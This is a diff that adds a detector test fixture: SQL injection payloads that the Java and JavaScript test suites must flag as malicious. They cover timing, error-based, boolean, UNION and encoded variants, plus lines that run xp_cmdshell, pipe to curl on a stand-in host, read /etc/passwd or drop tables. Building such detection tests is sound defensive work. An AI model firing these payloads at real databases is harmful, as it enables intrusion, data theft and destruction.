@@ -1,0 +1,76 @@
+# One payload per line. Lines starting with "# " are comments.
+# Shared by the Java and JavaScript test suites: every line MUST be flagged malicious.
+
+# --- From the reported attacks: RAISE EXCEPTION marker ---
+1';DO $$BEGIN RAISE EXCEPTION '%', (SELECT version()); END$$;--
+';DO $$ BEGIN RAISE EXCEPTION 'x%', current_user; END $$--
+1 AND 1=1;RAISE EXCEPTION 'marker'
+RAISE/**/EXCEPTION/**/'%',version()
+
+# --- pg_sleep (stacked) ---
+1;SELECT pg_sleep(5)--
+1'; SELECT pg_sleep(10);--
+1);SELECT PG_SLEEP(5)--
+1;select pg_sl/**/eep(5)--
+%31%3bSELECT%20pg_sleep(5)--
+1;SELECT pg_sleep_for('5 seconds')--
+
+# --- pg_sleep (boolean-OR) ---
+' OR 1=(SELECT 1 FROM PG_SLEEP(5))--
+1 OR (SELECT 1 FROM pg_sleep(5)) IS NULL
+' OR pg_sleep(5)--
+1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+x' || pg_sleep(5) || '
+
+# --- version() CAST error ---
+1' AND 1=CAST((SELECT version()) AS int)--
+1 AND 1=CAST(version() AS numeric)
+' AND 1=CAST(current_user AS int)--
+1 AND version()::int=1
+'||CAST(version() AS INTEGER)||'
+1 AND 1=CAST(chr(126)||version() AS int)
+
+# --- boolean OR 1=1 / 1=2 ---
+' OR 1=1--
+' OR '1'='1
+' or 'a'='a
+1 OR 1=1
+1 AND 1=2
+admin' OR 1=1#
+') OR ('1'='1
+1' oR(1)=(1)--
+%27%20OR%201%3D1--
+%2527%2520OR%25201%253D1--
+＇ ＯＲ １＝１－－
+' or ''='
+1 OR true=true
+
+# --- EXECUTE dynamic marker ---
+';DO $$ BEGIN EXECUTE 'SELECT pg_sleep(5)'; END $$;--
+1;EXECUTE format('SELECT %s', version())--
+';EXECU/**/TE 'SEL'||'ECT 1'--
+'; EXEC('SELECT 1')--
+'; EXEC sp_executesql N'SELECT 1'--
+'; EXEC xp_cmdshell 'whoami'--
+1; DECLARE @q varchar(99); SET @q='x'; EXEC(@q)
+
+# --- Other common techniques ---
+admin'--
+admin'-- -
+admin'/*
+1 UNION SELECT null,version()--
+1 UnIoN/**/SeLeCt username,password FROM users
+1 /*!50000UNION*/ /*!50000SELECT*/ 1,2
+-1 UNION ALL SELECT table_name FROM information_schema.tables--
+1 AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1)
+1 AND SLEEP(5)
+1' AND BENCHMARK(5000000,MD5(1))--
+1; WAITFOR DELAY '0:0:5'--
+1 AND extractvalue(1,concat(0x7e,version()))
+'; COPY (SELECT '') TO PROGRAM 'curl http://x.example'--
+1; SELECT pg_read_file('/etc/passwd')--
+1'; DROP TABLE users--
+1; INSERT INTO admins VALUES ('x')--
+1 AND EXISTS(SELECT * FROM pg_shadow)
+1 ORDER BY 10--
+1 AND dbms_pipe.receive_message('a',5)=1
